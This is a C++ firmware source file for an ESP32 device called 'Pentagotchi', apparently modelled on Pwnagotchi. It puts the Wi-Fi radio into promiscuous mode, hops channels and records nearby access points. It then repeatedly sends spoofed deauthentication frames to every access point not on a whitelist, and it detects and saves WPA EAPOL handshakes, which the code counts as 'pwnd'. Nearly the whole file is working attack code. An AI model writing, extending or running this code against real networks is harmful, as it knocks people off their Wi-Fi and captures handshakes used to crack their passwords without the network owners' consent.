#include "pentagotchi_app.h"

#include "pentagotchi_internal.h"

#include <ArduinoJson.h>
#include <esp_err.h>
#include <esp_event.h>
#include <esp_heap_caps.h>
#include <esp_log.h>
#include <esp_netif.h>
#include <esp_random.h>
#include <esp_wifi.h>
#include <freertos/task.h>
#include <nvs_flash.h>

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <iterator>
#include <vector>

using namespace pentagotchi::detail;

extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, const void *buffer, int len);

namespace {

esp_err_t sendRawFrame(wifi_interface_t ifx, const void *frame, int len, const char *tag) {
    esp_err_t err = esp_wifi_internal_tx(ifx, frame, len);
    if (err == ESP_ERR_NOT_SUPPORTED || err == ESP_ERR_INVALID_ARG) {
        ESP_LOGW(kLogTag, "%s internal TX unsupported on iface %d (%s); falling back",
                 tag, static_cast<int>(ifx), esp_err_to_name(err));
        err = esp_wifi_80211_tx(ifx, frame, len, false);
    }
    return err;
}

} // namespace

void PentagotchiApp::initWifi() {
    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        err = nvs_flash_init();
    }
    ESP_ERROR_CHECK(err);

    ESP_ERROR_CHECK(esp_netif_init());
    esp_event_loop_create_default();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(kTxPowerDefault));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&kPromiscuousFilter));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&PentagotchiApp::wifiPromiscuousCallback));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_set_channel(static_cast<uint8_t>(1 + random(0, 3) * 5), WIFI_SECOND_CHAN_NONE));
}

void PentagotchiApp::rotateChannel() {
    static const uint8_t kChannels[] = {1, 6, 11};
    constexpr size_t kChannelCount = sizeof(kChannels) / sizeof(kChannels[0]);
    currentChannelIndex = (currentChannelIndex + 1) % kChannelCount;
    const uint8_t channel = kChannels[currentChannelIndex];
    if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        ESP_LOGW(kLogTag, "Failed to set channel %u", channel);
    }
}

void PentagotchiApp::performDeauthCycle() {
    std::vector<BeaconEntry> snapshot;
    snapshot.reserve(gRegisteredBeacons.size());
    portENTER_CRITICAL(&gRadioMux);
    std::copy(gRegisteredBeacons.begin(), gRegisteredBeacons.end(), std::back_inserter(snapshot));
    portEXIT_CRITICAL(&gRadioMux);

    if (snapshot.empty()) { return; }

    uint8_t originalChannel = readWifiChannel();

    for (const auto &entry : snapshot) {
        if (entry.channel != originalChannel) { continue; }

        // Skip networks in config whitelist
        bool whitelisted = false;
        for (uint8_t w = 0; w < config.whitelist_count; ++w) {
            if (memcmp(config.whitelist[w], entry.mac, 6) == 0) {
                whitelisted = true;
                break;
            }
        }
        if (whitelisted) { continue; }

        uint8_t frame[sizeof(kDeauthFrameTemplate)];
        memcpy(frame, kDeauthFrameTemplate, sizeof(kDeauthFrameTemplate));
        memcpy(frame + 10, entry.mac, 6);
        memcpy(frame + 16, entry.mac, 6);

        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 entry.mac[0], entry.mac[1], entry.mac[2],
                 entry.mac[3], entry.mac[4], entry.mac[5]);

        esp_wifi_set_channel(entry.channel, WIFI_SECOND_CHAN_NONE);
        for (int i = 0; i < 3; ++i) {
            esp_err_t err = sendRawFrame(WIFI_IF_STA, frame, sizeof(frame), "Deauth");
            if (err != ESP_OK) {
                ESP_LOGW(kLogTag, "Deauth tx failed on STA iface: %s", esp_err_to_name(err));
            }
        }
        pwn_ui_on_deauth(macStr);
    }

    esp_wifi_set_channel(originalChannel, WIFI_SECOND_CHAN_NONE);
}

bool PentagotchiApp::isItEapol(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    const int len = packet->rx_ctrl.sig_len;

    if (len < 36) { return false; }

    const uint16_t frameCtrl = static_cast<uint16_t>(frame[0]) | (static_cast<uint16_t>(frame[1]) << 8);
    const uint8_t type = (frameCtrl & 0x0C) >> 2;
    if (type != 0x02) { return false; }

    size_t hdrLen = 24;
    const bool toDs = frame[1] & 0x01;
    const bool fromDs = frame[1] & 0x02;
    if (toDs && fromDs) { hdrLen += 6; }
    const uint8_t subtype = (frameCtrl & 0xF0) >> 4;
    if (subtype & 0x08) { hdrLen += 2; }
    if (frame[1] & 0x80) { hdrLen += 4; }

    if (len < static_cast<int>(hdrLen + 8)) { return false; }

    const uint8_t *llc = frame + hdrLen;
    const int llcLen = len - static_cast<int>(hdrLen);
    if (llcLen < 8) { return false; }

    if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 && llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00) {
        const uint8_t *ethType = llc + 6;
        if (ethType[0] == 0x88 && ethType[1] == 0x8E) { return true; }
        if (ethType[0] == 0x81 && ethType[1] == 0x00 && llcLen >= 12) {
            const uint8_t *innerType = ethType + 4;
            if (innerType[0] == 0x88 && innerType[1] == 0x8E) { return true; }
        }
    }

    for (int i = static_cast<int>(hdrLen); i <= len - 2; ++i) {
        if (frame[i] == 0x88 && frame[i + 1] == 0x8E) { return true; }
    }
    return false;
}

void PentagotchiApp::wifiPromiscuousCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!gInstance) { return; }

    auto *packet = static_cast<wifi_promiscuous_pkt_t *>(buf);
    const uint8_t *frame = packet->payload;
    const uint16_t frameCtrl = static_cast<uint16_t>(frame[0]) | (static_cast<uint16_t>(frame[1]) << 8);
    const uint8_t frameType = (frameCtrl & 0x0C) >> 2;
    const uint8_t frameSubtype = (frameCtrl & 0xF0) >> 4;

    static uint32_t mgmtCount = 0;
    static uint32_t dataCount = 0;
    static uint32_t ctrlCount = 0;
    static uint32_t eapolCandidates = 0;
    static uint32_t lastDump = 0;
    static uint32_t debugFrames = 0;

    switch (type) {
    case WIFI_PKT_MGMT:
        ++mgmtCount;
        break;
    case WIFI_PKT_DATA:
        ++dataCount;
        break;
    case WIFI_PKT_CTRL:
        ++ctrlCount;
        break;
    default:
        break;
    }

    if (frameType == 0x02) {
        ++eapolCandidates;
        if (debugFrames < 10) {
            size_t hdrLen = 24;
            const bool toDs = frame[1] & 0x01;
            const bool fromDs = frame[1] & 0x02;
            if (toDs && fromDs) { hdrLen += 6; }
            if (frameSubtype & 0x08) { hdrLen += 2; }
            if (frame[1] & 0x80) { hdrLen += 4; }
            const uint8_t *llc = (packet->rx_ctrl.sig_len > hdrLen) ? frame + hdrLen : frame + 24;
            SERIAL_PRINTF(
                "[pentagotchi] data subtype=%u len=%u hdr=%u llc=%02X %02X %02X %02X %02X %02X %02X %02X\n",
                static_cast<unsigned>(frameSubtype),
                static_cast<unsigned>(packet->rx_ctrl.sig_len),
                static_cast<unsigned>(hdrLen),
                llc[0],
                llc[1],
                llc[2],
                llc[3],
                llc[4],
                llc[5],
                llc[6],
                llc[7]);
            ++debugFrames;
        }
    }

    uint32_t now = millis();
    if (now - lastDump > 3000) {
        SERIAL_PRINTF(
            "[pentagotchi] promisc stats mgmt=%lu data=%lu ctrl=%lu candidates=%lu\n",
            static_cast<unsigned long>(mgmtCount),
            static_cast<unsigned long>(dataCount),
            static_cast<unsigned long>(ctrlCount),
            static_cast<unsigned long>(eapolCandidates));
        lastDump = now;
        mgmtCount = dataCount = ctrlCount = eapolCandidates = 0;
        debugFrames = 0;
    }

    if (isItEapol(packet)) {
        const uint8_t *dest = frame + 4;
        const uint8_t *src = frame + 10;
        const uint8_t *bssid = frame + 16;
        uint64_t bssidKey = 0;
        memcpy(&bssidKey, bssid, 6);
        if (gHandshakeBssids.find(bssidKey) == gHandshakeBssids.end()) {
            gHandshakeBssids.insert(bssidKey);
            ++gHandshakeCount;
            ++gInstance->stats.total_pwnd;
            ++gInstance->statsChanges;
            gInstance->handshakePending = true;
        }
        char destMac[18] = {0};
        char srcMac[18] = {0};
        char bssidMac[18] = {0};
        snprintf(destMac, sizeof(destMac), "%02X:%02X:%02X:%02X:%02X:%02X", dest[0], dest[1], dest[2], dest[3], dest[4], dest[5]);
        snprintf(srcMac, sizeof(srcMac), "%02X:%02X:%02X:%02X:%02X:%02X", src[0], src[1], src[2], src[3], src[4], src[5]);
        snprintf(bssidMac, sizeof(bssidMac), "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        ESP_LOGI(
            kLogTag,
            "EAPOL frame #%d len=%u rssi=%d channel=%u src=%s dst=%s bssid=%s",
            gHandshakeCount,
            packet->rx_ctrl.sig_len,
            packet->rx_ctrl.rssi,
            packet->rx_ctrl.channel,
            srcMac,
            destMac,
            bssidMac);
        SERIAL_PRINTF(
            "[pentagotchi] EAPOL #%d len=%u rssi=%d ch=%u src=%s dst=%s bssid=%s\n",
            gHandshakeCount,
            packet->rx_ctrl.sig_len,
            packet->rx_ctrl.rssi,
            packet->rx_ctrl.channel,
            srcMac,
            destMac,
            bssidMac);
        gInstance->saveHandshake(packet);
    }

    if (frameType == 0x00 && frameSubtype == 0x08) {
        const uint8_t *sender = frame + 10;
        if (!pentagotchi_grid_handle_mgmt(packet)) {
            BeaconEntry entry;
            memcpy(entry.mac, sender, sizeof(entry.mac));
            entry.channel = readWifiChannel();
            portENTER_CRITICAL(&gRadioMux);
            auto inserted = gRegisteredBeacons.insert(entry);
            portEXIT_CRITICAL(&gRadioMux);
            if (inserted.second) {
                ++gInstance->stats.total_aps;
                ++gInstance->statsChanges;
            }
        }
    }
}
